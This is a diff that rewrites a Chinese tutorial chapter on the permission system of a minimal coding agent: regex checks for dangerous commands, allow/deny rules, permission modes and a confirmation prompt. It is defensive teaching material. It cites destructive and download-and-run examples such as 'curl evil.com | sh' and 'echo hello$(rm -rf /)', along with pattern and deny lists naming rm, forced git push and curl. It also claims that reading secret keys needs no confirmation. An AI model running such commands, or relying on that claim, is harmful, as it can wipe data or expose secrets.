@@ -1,73 +1,62 @@
-# 6. 权限与安全
+# 第 08 课：权限与安全限制
 
-## 本章目标
+## 🎯 本节目标
 
-实现完整的权限安全机制：危险命令检测 → 可配置的 allow/deny 权限规则 → 统一权限检查 → 会话级白名单 → 用户确认对话框。从"写死的规则"到"用户定义规则"，让 agent 自动放行安全操作、自动拦截危险操作，无需每次手动确认。
+为 Agent 构筑一道坚实的安全防线。实现纵深权限拦截引擎：检测危险 Shell 命令，解析项目级与全局的 `settings.json` 规则，支持 5 种不同的权限安全模式，并提供带有会话级白名单保护的 `y/n` 交互式确认弹窗。
 
-```mermaid
-graph TB
-    Call[工具调用] --> Mode{权限模式检查}
-    Mode -->|bypassPermissions| Exec[直接执行]
-    Mode -->|plan/dontAsk/...| Rules{权限规则匹配}
-    Rules -->|deny 命中| Block[直接拦截<br/>返回 denied 给模型]
-    Rules -->|allow 命中| Exec
-    Rules -->|无匹配| Builtin{内置危险模式检查}
-    Builtin -->|安全| Exec
-    Builtin -->|危险| WL{会话白名单?}
-    WL -->|已授权| Exec
-    WL -->|未授权| Confirm{用户确认?}
-    Confirm -->|y| AddWL[加入白名单]
-    AddWL --> Exec
-    Confirm -->|n| Block2[返回 denied]
+---
 
-    style Mode fill:#4a3aad,color:#fff
-    style Rules fill:#7c5cfc,color:#fff
-    style Builtin fill:#e8e0ff
-    style Block fill:#ff6b6b,color:#fff
-```
+## 🏆 最终效果
 
-核心思路：**多层检查，deny 优先**。权限模式（全局策略）→ 配置文件规则（Layer 1）→ 内置危险模式检测（Layer 2）→ 会话白名单 → 用户确认。
+完成本节后，当 Agent 尝试运行具有破坏性的 Shell 命令（如 `git push --force` 或 `rm -rf`）或在未授权模式下修改系统敏感文件时：
+- 终端会自动暂停，弹出醒目的黄字警告并询问用户 `Allow? (y/n): `。
+- 用户输入 `y` 同意后，命令继续执行，且相同的命令在该会话中会被加入白名单，不会重复弹窗打扰用户。
+- 用户若输入 `n` 拒绝，Agent 将立刻获得一个表示“被拒绝”的工具结果回复，并被逼退去思考更加安全的备选方案，而绝不会让程序发生崩溃。
 
-## Claude Code 怎么做的
+---
 
-Claude Code 在真实环境执行代码——读写文件、运行 Shell、操作 Git。安全机制不到位，一条 `rm -rf /` 就能造成灾难。因此它采用了**纵深防御（Defense in Depth）**：7 个独立的安全层，即使某一层被绕过，其他层仍然有效。
+## 🛠️ 本节任务
 
-### 7 层纵深防御
+1. **实现危险命令匹配器**：在 `tools.py` 中编写 `is_dangerous` 函数，用正则匹配具有破坏性的 Shell 命令。
+2. **实现配置文件权限加载**：实现 `_load_settings` 和规则匹配，能够读取全局与项目级的安全配置。
+3. **编写统一权限评判引擎**：在 `tools.py` 中实现 `check_permission()`，结合安全模式、配置文件、只读工具等做出 allow/deny/confirm 决策。
+4. **与 Agent 循环对接并实现确认弹窗**：在 `agent.py` 中接入权限限制，管理已确认过的命令白名单，并支持 REPL 下的 `y/n` 实时确认。
 
-| 层 | 机制 | 核心作用 |
-|----|------|---------|
-| 1 | Trust Dialog | 首次进入目录时确认信任，防止恶意项目的 Hook 自动执行 |
-| 2 | 权限模式 | 全局策略开关（default/plan/acceptEdits/bypassPermissions/dontAsk） |
-| 3 | 权限规则匹配 | allow/deny/ask 规则，8 个来源，优先级从企业策略到会话级 |
-| 4 | Bash AST 分析 | tree-sitter 解析命令为 AST，23 项静态安全检查，FAIL-CLOSED 原则 |
-| 5 | 工具级验证 | validateInput + checkPermissions，保护危险文件路径和路径边界 |
-| 6 | 沙箱隔离 | macOS Seatbelt / Linux namespace，限制文件系统和网络访问范围 |
-| 7 | 用户确认 | 交互对话框 + Hook + ML 分类器竞速，第一个决定生效 |
+---
 
-几个值得了解的设计细节：
+## 📦 涉及文件
 
-**`bypassPermissions`（--yolo）并不是真的绕过一切**。源码检查顺序是：先检查 deny 规则（命中直接拒绝）→ 再检查 bypass-immune 路径（`.git/`、`.claude/` 等仍需确认）→ 最后才跳过普通确认。管理员通过 deny 规则可以对 `--yolo` 施加约束。
+修改：
+- `python/mini_claude/tools.py`
+- `python/mini_claude/agent.py`
 
-**Layer 4 为什么不用正则**：Shell 语法复杂，正则面对 `echo hello$(rm -rf /)` 这类命令会看到的是 `echo hello`，实际执行的却是 `rm -rf /`。tree-sitter 真正解析 AST，不理解的结构（命令替换、变量展开、控制流等）一律标记为 `too-complex`，要求用户确认。
+---
 
-**8 种规则来源，严格优先级**：企业 MDM 策略（不可覆盖）> 用户全局 > 项目级（提交到仓库）> 本地项目（不提交）> CLI 参数 > 运行时参数 > 命令定义 > 会话级（点"始终允许"产生）。低优先级不能覆盖高优先级——企业策略 deny 的操作，用户在任何层级写 allow 都无效。
+## 🚀 开始实现
 
-**3 种匹配类型**：精确匹配（`Bash(git status)`）、前缀匹配（`Bash(npm:*)`）、通配符匹配（`Bash(git * --no-verify)`）。通配符以空格+`*` 结尾时尾部可选，与前缀语法行为保持一致。
+### 步骤 1：危险命令静态扫描器
 
-**Layer 7 的竞速机制**：UI 对话框、PermissionRequest Hook、ML 分类器三者同时启动，`createResolveOnce` 守卫确保只有第一个决定生效。一旦用户触碰对话框，Hook 和分类器的结果一律被丢弃——人类意图永远优先。对话框还有 200ms 防误触宽限期。
+#### 为什么做
 
-**拒绝追踪**：连续拒绝 3 次触发降级（auto 模式回退到交互确认），总拒绝 20 次中止 Agent 执行——防止模型陷入反复尝试被拒绝操作的死循环。
+最直接的安全漏洞来自 `run_shell` 命令的滥用。如果模型被引导运行恶意指令或产生了破坏性幻觉（如 `git checkout .` 意外抹去你本地没保存的代码），我们必须能在执行前将其扫描拦截。我们将定义 16 个典型危险命令正则模式（兼容 Unix/Windows）作为内置检测的第二防线。
 
-## 我们的实现
+#### 做什么
 
-把 7 层简化为 **4 层**：危险命令检测、权限规则系统、统一权限检查、会话级白名单。8 种规则来源简化为 **2 种**（用户级 + 项目级），3 种规则行为简化为 **2 种**（allow + deny）。
-
-### 1. 危险命令检测
-
-用 16 个正则覆盖最常见的破坏性操作（10 个 Unix + 6 个 Windows）：
+修改 `tools.py`，导入必要包，定义安全白名单和危险正则规则：
 
 ```python
-# tools.py
+# tools.py 中的修改
+
+import re
+import json
+from pathlib import Path
+
+# 读工具永远不需要确认权限
+READ_TOOLS = {"read_file", "list_files", "grep_search", "web_fetch"}
+# 写/编辑工具属于敏感操作
+EDIT_TOOLS = {"write_file", "edit_file"}
+
+# 16 个内置的危险 Shell 命令正则扫描模式（兼容 Unix & Windows）
 DANGEROUS_PATTERNS = [
     re.compile(r"\brm\s"),
     re.compile(r"\bgit\s+(push|reset|clean|checkout\s+\.)"),
@@ -87,71 +76,66 @@ DANGEROUS_PATTERNS = [
     re.compile(r"\bStop-Process\s", re.IGNORECASE),
 ]
 
+
 def is_dangerous(command: str) -> bool:
+    # 只要命中任意正则，即标记为危险
     return any(p.search(command) for p in DANGEROUS_PATTERNS)
 ```
 
-Windows 模式加 `i` 标志是因为 Windows 命令本身不区分大小写。
+---
 
-局限性很明显：`find / -delete`、`curl evil.com | sh` 这类危险命令不会被捕获。这就是 Claude Code 选择 AST 分析的原因——但对最小实现来说，16 个正则覆盖了大多数常见情况。
+### 步骤 2：读取配置文件并匹配 allow/deny 规则
 
-### 2. 权限规则系统
+#### 为什么做
 
-除内置危险检测外，支持通过配置文件预定义 allow/deny 规则，让 agent 自动放行安全操作、自动拦截危险操作。
+静态的检测无法应付各种定制需求。我们需要支持类似于 Claude Code 的 `settings.json` 权限配置，允许用户在全局（`~/.claude/settings.json`）和项目级（`./.claude/settings.json`）配置自定义规则。
+- 规则格式如 `run_shell(npm test*)` 表示允许以 `npm test` 开头的命令。
+- 我们需要支持精确匹配和带 `*` 的前缀通配符匹配。
 
-#### 规则解析（parseRule）
+#### 做什么
 
-把字符串规则拆成结构化数据。`run_shell(npm test*)` → `{tool: "run_shell", pattern: "npm test*"}`，裸工具名 → `{tool: "read_file", pattern: null}`。
+在 `tools.py` 中编写配置读取、规则解析与判定方法：
 
 ```python
-# tools.py
+# tools.py（续）
+
+
+def _load_settings(path: Path) -> dict:
+    if not path.exists():
+        return {}
+    try:
+        return json.loads(path.read_text(encoding="utf-8"))
+    except Exception:
+        return {}
+
 
 def _parse_rule(rule: str) -> dict:
+    # 匹配类似于 run_shell(git status) 的格式
     m = re.match(r"^([a-z_]+)\((.+)\)$", rule)
     if m:
         return {"tool": m.group(1), "pattern": m.group(2)}
     return {"tool": rule, "pattern": None}
-```
 
-#### 加载规则（loadPermissionRules）
-
-两个文件的规则**追加**到同一个数组（不是覆盖），所以用户级和项目级规则并存。结果缓存在内存里——一个会话有几十上百次工具调用，每次都读磁盘没必要。
-
-```python
-# tools.py
-
-_cached_rules: dict | None = None
 
 def load_permission_rules() -> dict:
-    global _cached_rules
-    if _cached_rules is not None:
-        return _cached_rules
-
-    allow: list[dict] = []
-    deny: list[dict] = []
-
-    user_settings = _load_settings(Path.home() / ".claude" / "settings.json")
-    project_settings = _load_settings(Path.cwd() / ".claude" / "settings.json")
-
-    for settings in [user_settings, project_settings]:
-        if not settings or "permissions" not in settings:
-            continue
-        perms = settings["permissions"]
+    allow = []
+    deny = []
+    
+    # 依次读取全局配置与当前目录项目级配置
+    paths = [
+        Path.home() / ".claude" / "settings.json",
+        Path.cwd() / ".claude" / "settings.json",
+    ]
+    for p in paths:
+        settings = _load_settings(p)
+        perms = settings.get("permissions", {})
         for r in perms.get("allow", []):
             allow.append(_parse_rule(r))
         for r in perms.get("deny", []):
             deny.append(_parse_rule(r))
+            
+    return {"allow": allow, "deny": deny}
 
-    _cached_rules = {"allow": allow, "deny": deny}
-    return _cached_rules
-```
-
-#### 规则匹配（matchesRule）
-
-三层判断：工具名不匹配直接跳过 → 无 pattern 则工具名匹配即可 → 有 pattern 则取 `command` 或 `file_path` 做匹配。支持两种匹配方式：尾部 `*` 做前缀匹配，否则精确匹配。
-
-```python
-# tools.py
 
 def _matches_rule(rule: dict, tool_name: str, inp: dict) -> bool:
     if rule["tool"] != tool_name:
@@ -159,49 +143,35 @@ def _matches_rule(rule: dict, tool_name: str, inp: dict) -> bool:
     if rule["pattern"] is None:
         return True
 
-    value = ""
-    if tool_name == "run_shell":
-        value = inp.get("command", "")
-    elif "file_path" in inp:
-        value = inp["file_path"]
-    else:
-        return True
-
+    # 提取实际被测试的值（Shell 命令或文件路径）
+    value = inp.get("command", "") if tool_name == "run_shell" else inp.get("file_path", "")
     pattern = rule["pattern"]
+    
     if pattern.endswith("*"):
         return value.startswith(pattern[:-1])
     return value == pattern
 ```
 
-注意：`run_shell(np*)` 会同时匹配 `npm` 和 `npx`，写规则时注意前缀精确度。
+---
 
-#### 规则检查（checkPermissionRules）
+### 步骤 3：编写统一权限评判引擎 `check_permission`
 
-返回值是三态：`"allow"` / `"deny"` / `null`（无意见，交给下一层）。deny 先于 allow 遍历，所以即使你写了 `allow: ["run_shell"]`，`deny: ["run_shell(rm -rf*)"]` 仍然生效——"先放开，再收紧"的规则写法因此成立。
+#### 为什么做
 
-```python
-# tools.py
+现在我们将前面的积木拼装起来。`check_permission` 是整个安全防火墙的唯一评估总线。它接受当前的工具调用和系统当前设定的“权限安全模式”，按照以下**漏洞防火墙的评估漏斗**输出三态动作之一：
+1. **`allow`**（安全，直接放行）
+2. **`deny`**（危险，拒绝并返回报错）
+3. **`confirm`**（可疑，挂起并弹窗询问用户）
 
-def _check_permission_rules(tool_name: str, inp: dict) -> str | None:
-    rules = load_permission_rules()
+**评估漏斗规则优先级**：`deny 规则` > `allow 规则` > `只读工具放行` > `安全模式限制` > `危险正则检测` > `默认放行`。
 
-    for rule in rules["deny"]:
-        if _matches_rule(rule, tool_name, inp):
-            return "deny"
-    for rule in rules["allow"]:
-        if _matches_rule(rule, tool_name, inp):
-            return "allow"
-    return None
-```
+#### 做什么
 
-### 3. 统一权限检查
-
-`checkPermission` 是权限系统的统一入口，整合了权限模式、配置文件规则和内置危险检测，返回 `{action, message}`，action 三种值：`allow`、`deny`、`confirm`。
-
-优先级：**deny 规则 > allow 规则 > 模式逻辑 > 内置危险检测 > 默认允许**。
+在 `tools.py` 中实现 `check_permission` 核心总线：
 
 ```python
-# tools.py — check_permission
+# tools.py（续）
+
 
 def check_permission(
     tool_name: str,
@@ -209,185 +179,220 @@ def check_permission(
     mode: str = "default",
     plan_file_path: str | None = None,
 ) -> dict:
-    """Returns {"action": "allow"|"deny"|"confirm", "message": ...}"""
+    # 0. 如果是 --yolo (bypassPermissions) 模式，无条件全部直接放行
     if mode == "bypassPermissions":
         return {"action": "allow"}
 
-    # Layer 1: 配置文件规则（deny 优先）
-    rule_result = _check_permission_rules(tool_name, inp)
-    if rule_result == "deny":
-        return {"action": "deny", "message": f"Denied by permission rule for {tool_name}"}
-    if rule_result == "allow":
-        return {"action": "allow"}
+    # 1. 拦截配置文件中的 deny 规则（优先级最高）
+    rules = load_permission_rules()
+    for rule in rules["deny"]:
+        if _matches_rule(rule, tool_name, inp):
+            return {"action": "deny", "message": f"Denied by rule: {rule['tool']}({rule['pattern']})"}
 
-    # 读工具永远安全
+    # 2. 匹配配置文件中的 allow 规则
+    for rule in rules["allow"]:
+        if _matches_rule(rule, tool_name, inp):
+            return {"action": "allow"}
+
+    # 3. 只读工具永远安全
     if tool_name in READ_TOOLS:
         return {"action": "allow"}
 
-    # 权限模式检查
+    # 4. plan 模式下，禁止除写入 plan 文件外的任何编辑/执行操作
     if mode == "plan":
         if tool_name in EDIT_TOOLS:
-            file_path = inp.get("file_path") or inp.get("path")
-            if plan_file_path and file_path == plan_file_path:
+            file_path = inp.get("file_path", "")
+            if plan_file_path and Path(file_path).resolve() == Path(plan_file_path).resolve():
                 return {"action": "allow"}
-            return {"action": "deny", "message": f"Blocked in plan mode: {tool_name}"}
+            return {"action": "deny", "message": f"Writing blocked in plan mode: {file_path}"}
         if tool_name == "run_shell":
             return {"action": "deny", "message": "Shell commands blocked in plan mode"}
 
+    # 5. acceptEdits 模式下，编辑文件直接放行
     if mode == "acceptEdits" and tool_name in EDIT_TOOLS:
         return {"action": "allow"}
 
-    # Layer 2: 内置危险模式检查
+    # 6. 内置危险检测（针对 run_shell 或是编辑/修改不存在的文件）
     needs_confirm = False
-    confirm_message = ""
+    confirm_msg = ""
 
     if tool_name == "run_shell" and is_dangerous(inp.get("command", "")):
         needs_confirm = True
-        confirm_message = inp.get("command", "")
-    elif tool_name == "write_file" and not Path(inp.get("file_path", "")).exists():
-        needs_confirm = True
-        confirm_message = f"write new file: {inp.get('file_path', '')}"
-    elif tool_name == "edit_file" and not Path(inp.get("file_path", "")).exists():
-        needs_confirm = True
-        confirm_message = f"edit non-existent file: {inp.get('file_path', '')}"
+        confirm_msg = inp.get("command", "")
+    elif tool_name in EDIT_TOOLS:
+        file_path = inp.get("file_path", "")
+        # 编辑不存在的文件需要确认，防止模型盲目乱建文件
+        if file_path and not Path(file_path).exists():
+            needs_confirm = True
+            confirm_msg = f"Create new file: {file_path}"
 
     if needs_confirm:
+        # dontAsk (CI 环境) 模式下，需要确认的操作直接无情拒绝
         if mode == "dontAsk":
-            return {"action": "deny", "message": f"Auto-denied (dontAsk mode): {confirm_message}"}
-        return {"action": "confirm", "message": confirm_message}
+            return {"action": "deny", "message": f"Auto-denied (dontAsk mode): {confirm_msg}"}
+        return {"action": "confirm", "message": confirm_msg}
 
+    # 7. 默认默认全部放行
     return {"action": "allow"}
 ```
 
-触发确认的条件：`run_shell` + 危险命令，`write_file` / `edit_file` + 目标不存在。`read_file`、`list_files`、`grep_search` 永远安全。Layer 1 无意见才进 Layer 2，两层都没拦住就默认允许。
+---
 
-### 4. 会话级白名单
+### 步骤 4：与 Agent 循环对接并实现确认弹窗
 
-在 Agent Loop 中，用 `confirmedPaths` Set 记住已授权的操作：
+#### 为什么做
 
-```python
-# agent.py
+我们在步骤 3 输出的 `confirm` 和 `deny` 动作必须被 Agent 严格贯彻。
+1. 若为 `deny`，Agent 绝对不能调起工具，要立即回填一个“操作被拒绝”的 Tool Result 喂回给大模型。
+2. 若为 `confirm`，Agent 在弹窗前必须先核对**会话级已确认白名单**。若白名单已记录此消息，直接运行；若无记录，暂停并阻塞等待用户命令行键入 `y/n` 回车确认。确认后将其存入白名单，保障后续交互体验。
 
-self._confirmed_paths: set[str] = set()
+#### 做什么
 
-perm = check_permission(tu.name, inp, self.permission_mode, self._plan_file_path)
-
-if perm["action"] == "deny":
-    print_info(f"Denied: {perm.get('message', '')}")
-    tool_results.append({"type": "tool_result", "tool_use_id": tu.id,
-                         "content": f"Action denied: {perm.get('message', '')}"})
-    continue
-
-if perm["action"] == "confirm" and perm.get("message") and perm["message"] not in self._confirmed_paths:
-    confirmed = await self._confirm_dangerous(perm["message"])
-    if not confirmed:
-        tool_results.append({"type": "tool_result", "tool_use_id": tu.id,
-                             "content": "User denied this action."})
-        continue
-    self._confirmed_paths.add(perm["message"])
-```
-
-拒绝时把 `"User denied this action."` 作为工具结果返回，而不是抛错或中断循环——LLM 看到后会调整策略，这是关键设计。deny 规则命中时不弹对话框，直接把拒绝消息返回给模型。confirm 走会话白名单，用户确认一次后同一操作不再重复询问。
-
-### 5. 确认对话框
+修改 `agent.py`，实现 `_confirm_dangerous` 并重构工具执行处理循环：
 
 ```python
-# agent.py
-async def _confirm_dangerous(self, command: str) -> bool:
-    print_confirmation(command)
-    if self.confirm_fn:
-        return await self.confirm_fn(command)
-    try:
-        answer = input("  Allow? (y/n): ")
-        return answer.lower().startswith("y")
-    except EOFError:
-        return False
+# agent.py 中的修改
+
+from .tools import check_permission  # 导入权限检查引擎
+
+
+class Agent:
+    # ... 在 __init__ 中增加 self.permission_mode = permission_mode
+    # ... 在 __init__ 中增加 self._confirmed_paths: set[str] = set()
+
+    async def _confirm_dangerous(self, message: str) -> bool:
+        # 打印醒目的黄字警告
+        print(f"\n  [yellow]⚠ Dangerous action request: {message}[/yellow]")
+        try:
+            answer = input("  Allow? (y/n): ")
+            return answer.strip().lower().startswith("y")
+        except EOFError:
+            return False
+
+    # ... 在 _chat_anthropic 的工具执行循环中修改为：
+            tool_results = []
+            for tu in tool_uses:
+                inp = dict(tu.input) if hasattr(tu.input, "items") else tu.input
+
+                # 【1. 执行统一权限评估】
+                perm = check_permission(
+                    tu.name, inp, self.permission_mode, self._plan_file_path
+                )
+
+                # 命中 Deny 拦截
+                if perm["action"] == "deny":
+                    print(f"  [red]✗ Action Denied: {perm.get('message')}[/red]")
+                    # 关键设计：将拒绝消息作为结果返回给模型，让模型自适应调整策略
+                    tool_results.append({
+                        "type": "tool_result",
+                        "tool_use_id": tu.id,
+                        "content": f"Error: Action denied: {perm.get('message')}",
+                    })
+                    continue
+
+                # 命中 Confirm，需弹窗二次确认
+                if perm["action"] == "confirm":
+                    confirm_key = perm["message"]
+                    # 检查是否已包含在会话白名单中，防重复弹窗打扰
+                    if confirm_key not in self._confirmed_paths:
+                        confirmed = await self._confirm_dangerous(confirm_key)
+                        if not confirmed:
+                            # 用户拒绝了确认
+                            tool_results.append({
+                                "type": "tool_result",
+                                "tool_use_id": tu.id,
+                                "content": "Error: User denied this action.",
+                            })
+                            continue
+                        # 用户授权成功，追加进当前会话的路径白名单中
+                        self._confirmed_paths.add(confirm_key)
+
+                # 【2. 常规工具执行】
+                # 此处省略原有执行工具与 early_task 判断，直接调用 execute_tool ...
 ```
-
-### 5 种权限模式
-
-| 模式 | 读工具 | 编辑工具 | Shell（安全） | Shell（危险） | 适用场景 |
-|------|--------|----------|-------------|-------------|---------|
-| `default` | ✅ | ⚠️ confirm(新文件) | ✅ | ⚠️ confirm | 日常使用 |
-| `plan` | ✅ | ❌ deny | ❌ deny | ❌ deny | 只规划不执行 |
-| `acceptEdits` | ✅ | ✅ | ✅ | ⚠️ confirm | 信任编辑 |
-| `bypassPermissions` | ✅ | ✅ | ✅ | ✅ | --yolo |
-| `dontAsk` | ✅ | ❌ deny | ✅ | ❌ deny | CI/非交互 |
-
-```bash
-mini-claude --yolo "..."           # bypassPermissions
-mini-claude --plan "..."           # plan mode
-mini-claude --accept-edits "..."   # acceptEdits
-mini-claude --dont-ask "..."       # dontAsk（CI 环境）
-```
-
-`plan` 模式下模型还可以通过 `enter_plan_mode` / `exit_plan_mode` 工具动态切换，系统会生成一个 plan 文件路径（`~/.claude/plans/plan-<sessionId>.md`）作为唯一可写文件。
-
-### 配置文件格式
-
-```json
-// ~/.claude/settings.json（用户级，全局生效）
-{
-  "permissions": {
-    "allow": [
-      "read_file",
-      "list_files",
-      "grep_search",
-      "run_shell(npm test*)",
-      "run_shell(git status)",
-      "run_shell(git diff*)"
-    ],
-    "deny": [
-      "run_shell(rm -rf*)",
-      "run_shell(git push --force*)"
-    ]
-  }
-}
-```
-
-```json
-// .claude/settings.json（项目级，提交到仓库）
-{
-  "permissions": {
-    "allow": ["run_shell(npm run build)"],
-    "deny": ["run_shell(curl*)"]
-  }
-}
-```
-
-两个文件的规则合并后一起生效。规则格式：
-- `"read_file"` — 匹配该工具的所有调用
-- `"run_shell(npm test*)"` — 匹配 `run_shell` 中命令以 `npm test` 开头的调用
-
-**为什么 deny 优先于 allow**：这是安全系统的标准设计。allow 优先的话，一旦你写了 `allow: ["run_shell"]` 就没法用 deny 排除危险子命令了。deny 优先让"先放开，再收紧"的配置方式成为可能：
-
-```json
-{
-  "permissions": {
-    "allow": ["run_shell(git *)"],
-    "deny": ["run_shell(git push --force*)"]
-  }
-}
-```
-
-**为什么没有 ask 规则**：Claude Code 的 ask 是给 bypassPermissions 设安全阀用的。我们的 `--yolo` 语义是"完全信任"，加 ask 规则反而矛盾。需要强制确认的操作，不加入 allow 列表就行——自然落到 Layer 2 的内置检查。
-
-## 与 Claude Code 的差距
-
-| 维度 | Claude Code | mini-claude |
-|------|------------|-------------|
-| 防御层次 | 7 层 | 4 层（模式 + 规则 + 检测 + 确认） |
-| 命令分析 | AST 解析（23 项检查） | 正则匹配（16 模式） |
-| 权限规则来源 | 8 源优先级 | 2 源（用户 + 项目） |
-| 规则行为 | allow / deny / ask | allow / deny |
-| 匹配方式 | 精确 / 前缀 / 通配符 | 精确 / 尾部通配符 |
-| 白名单 | 持久化 + 会话级 | 会话级 Set |
-| 沙箱 | macOS Seatbelt / Linux namespace | 无 |
-| bypass-immune 路径 | .git/、.ssh/ 等强制确认 | 无 |
-| 拒绝追踪 | 3/20 次阈值降级 | 无 |
-
-核心架构已对齐——5 种权限模式 + 配置化规则 + 内置检测，层次清晰。从"写死的规则"到"用户定义规则"，是从个人工具迈向团队工具的关键一步。
 
 ---
 
-> **下一章**：Agent 对话越来越长，上下文窗口快满了——4 层压缩流水线让它看起来拥有无限记忆。
+## ⚖️ 设计权衡
+
+### 拦截报错作为异常终止 vs 拦截报错作为 Tool Result 返回给模型
+
+- **方案 A**：**作为 Tool Result 返回给模型**（我们所用）
+  - 拦截后，不掐断会话。构造一个假的工具运行结果，告诉大模型该项动作已被系统拦截（例如返回 `Error: Action denied: ...`）。
+  - **优点**：Agent 仍然能够正常运转，并且可以通过大模型极强的语义理解力“自我纠正”——例如被拦截了危险的 `rm -rf`，大模型会道歉并改用安全的 `run_shell("git clean")`，不需要人类二次干预。
+  - **缺点**：如果大模型很倔强，可能会反复尝试被拒绝的操作（我们可以通过在第 13 章引入总步数限制来防爆）。
+- **方案 B**：**直接抛出 Exception 终止会话**
+  - 一旦触发 deny 或用户输入 `n`，抛出运行时异常直接令程序退出。
+  - **优点**：绝对安全。
+  - **缺点**：交互极其生硬，模型没有自我调整策略的任何机会，体验极差。
+
+**结论**：方案 A 完美地践行了“错误是数据而不是程序崩溃”的 Agent 设计信条，能极大增强 Agent 的自适应纠错能力。
+
+---
+
+## ⚠️ 常见陷阱
+
+### 1. `deny` 拦截时未能加入 `tool_use_id` 拼装
+
+```python
+# ❌ 错误：在拦截 deny 时，直接使用 continue 跳出了循环而未返回 tool_result
+if perm["action"] == "deny":
+    continue
+```
+
+**后果**：由于大模型提出了工具调用申请，但响应中没有给出对应的 `tool_result` 对齐，会导致 API 在下一轮报错崩溃，直接破坏了对话历史一致性。
+**修正**：必须将拦截消息伪装成 `tool_result` 结果，带上 `tool_use_id` 推回历史中。
+
+---
+
+### 2. `--yolo` 模式下依然误弹拦截警告
+
+如果权限评估总线在 `bypassPermissions`（即 `--yolo`）模式下没有写在最顶层放行，就会导致用户明明开启了免确认，系统还是会频繁弹出危险命令确认窗口。
+
+**修正**：在 `check_permission` 评估函数最开头的第 0 行，必须立刻对 `bypassPermissions` 模式进行直接 `allow` 放行。
+
+---
+
+## ✅ 验收点
+
+### 输入与验证
+
+1. 在当前目录下建立一个 `.claude` 目录并在里面创建 `settings.json`：
+   ```json
+   {
+     "permissions": {
+       "deny": [
+         "run_shell(git push*)"
+       ]
+     }
+   }
+   ```
+2. 启动 Agent，要求其测试 push：
+   ```bash
+   python -m mini_claude "将代码强推上库"
+   ```
+3. 验证安全模式拦截：
+   - 观察终端是否出现 `✗ Action Denied: Denied by rule: run_shell(git push*)` 的拦截字样，且没有发生程序报错退出。
+
+*测试完成后，请记得删除 `.claude/settings.json` 以免干扰后边开发。*
+
+---
+
+## 🧠 思考题
+
+1. **为什么在 `load_permission_rules` 中，我们将“全局设置”和“项目本地设置”读取出的规则，是用全局先追加、项目后追加的形式加入同一个数组，并且匹配时 deny 规则的匹配先于 allow 规则遍历？**
+   *(提示：这代表项目本地的配置优先级更高，且由于 `deny 优先判定`，用户可以使用 allow 规则放开大部分命令，再专门编写 deny 规则进行细节上的高危排除，是系统安全设计的行业标准。)*
+2. **在 `check_permission` 中，为什么 `read_file` 等工具被判定为“永远放行”？读取文件难道不会泄露隐私或密钥吗？**
+   *(提示：只读工具不具备写盘或破坏外部世界物理状态的能力，属于“低爆炸半径”操作。如果读取了密钥，在本地沙箱内仍然是安全的；对它的防护通常应放在外层的环境隔离和网络防泄露上，而不是在工具执行阶段频繁弹框干扰开发心智。)*
+
+---
+
+## 📦 本节收获
+
+1. **漏斗防御模型**：学会了利用多层过滤门槛（全局模式、规则库、动态正则扫描）构筑防卫体系。
+2. **三态判定法**：掌握了利用 `allow`/`deny`/`confirm` 优雅判定复杂环境操作的架构技巧。
+3. **已确认白名单机制**：理解了如何通过会话级白名单在用户安全性与交互丝滑感之间进行完美权衡。
+
+---
+
+> **下一章**：现在 Agent 既快速、交互好又具备安全性。但频繁对话很快就会撑爆大模型的上下文窗口，下一章我们将来构建上下文管理的灵魂——4 层分级压缩流水线。
